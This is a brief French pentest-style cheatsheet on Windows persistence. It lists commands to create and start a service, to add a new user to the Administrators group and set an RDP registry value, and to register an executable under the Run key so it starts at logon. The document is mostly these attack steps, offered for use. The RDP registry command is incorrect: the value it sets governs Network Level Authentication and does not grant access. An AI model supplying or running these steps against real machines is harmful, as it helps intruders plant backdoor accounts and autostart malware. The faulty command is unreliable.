---
description: Persistence Windows - Cheatsheet
---

# Persistence Windows



1. <mark style="color:yellow;">Service Windows :</mark>

* Utilisez la commande `sc` pour créer un nouveau service Windows : sc create NomDuService binPath= `chemin\vers\mon_executable.exe` - Démarrez le service nouvellement créé : `sc start NomDuService` - Assurez-vous que l'exécutable est présent et qu'il fonctionne.

2. <mark style="color:yellow;">Ajout d'un nouvel utilisateur au groupe Administrateurs et RDP :</mark>

* Utilisez la commande `net user` pour créer un nouvel utilisateur : net user NomUtilisateur MotDePasse /add - Ajoutez l'utilisateur au groupe Administrateurs : net localgroup Administrateurs NomUtilisateur /add - Activez l'accès RDP pour l'utilisateur : `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f`

3. <mark style="color:yellow;">Run Key (Clé d'exécution automatique) :</mark>

* Utilisez l'Éditeur du Registre (regedit) pour accéder à la clé : HKEY\_CURRENT\_USER\Software\Microsoft\Windows\CurrentVersion\Run - Créez une nouvelle valeur chaîne (String Value) avec le nom souhaité et définissez le chemin du fichier exécutable à exécuter au démarrage. - Assurez-vous que le fichier exécutable est présent et fonctionnel.
